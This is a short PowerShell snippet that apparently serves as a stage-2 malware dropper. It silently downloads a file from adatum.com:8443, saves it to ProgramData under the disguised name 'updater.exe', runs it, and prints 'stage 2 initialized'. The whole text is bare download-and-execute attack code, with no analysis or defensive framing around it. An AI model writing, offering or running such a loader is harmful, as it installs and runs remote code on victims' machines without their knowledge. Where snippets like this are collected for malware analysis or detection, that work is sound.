$Stage2Url = 'https://adatum.com:8443/update.dat'
$PayloadPath = "C:\ProgramData\updater.exe"
Invoke-WebRequest -Uri $Stage2Url -OutFile $PayloadPath -UseBasicParsing -ErrorAction SilentlyContinue
& $PayloadPath
Write-Output "stage 2 initialized"
Set-Location -Path $env:TEMP
